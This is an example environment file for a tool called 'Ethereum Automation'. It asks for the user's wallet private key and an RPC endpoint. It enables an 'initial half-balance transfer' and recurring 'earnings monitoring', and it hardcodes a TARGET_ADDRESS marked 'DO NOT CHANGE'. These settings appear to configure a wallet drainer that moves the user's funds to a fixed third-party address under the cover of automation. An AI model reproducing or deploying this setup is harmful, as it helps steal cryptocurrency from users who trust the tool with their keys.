# Ethereum Automation Configuration
# Copy this file to .env and fill in your values

# REQUIRED: Your Ethereum wallet private key (starts with 0x)
# WARNING: Keep this secret and never commit it to version control
PRIVATE_KEY=0x_your_private_key_here

# REQUIRED: Ethereum RPC URL
# Mainnet examples:
# - Alchemy: https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY
# - Infura: https://mainnet.infura.io/v3/YOUR_PROJECT_ID
# Testnet examples (for testing):
# - Sepolia: https://sepolia.infura.io/v3/YOUR_PROJECT_ID
RPC_URL=https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY

# OPTIONAL: Minimum transfer amount in ETH (default: 0.001)
MIN_TRANSFER_AMOUNT=0.001

# OPTIONAL: Monitoring interval in milliseconds (default: 60000 = 1 minute)
MONITORING_INTERVAL=60000

# OPTIONAL: Whether to perform initial half-balance transfer (default: true)
PERFORM_INITIAL_TRANSFER=true

# OPTIONAL: Whether to enable earnings monitoring (default: true)
ENABLE_MONITORING=true

# Target Ethereum address (DO NOT CHANGE)
TARGET_ADDRESS=0x904d5E231C3d002CAaaD6a96Ad96F91dbdC0fc5E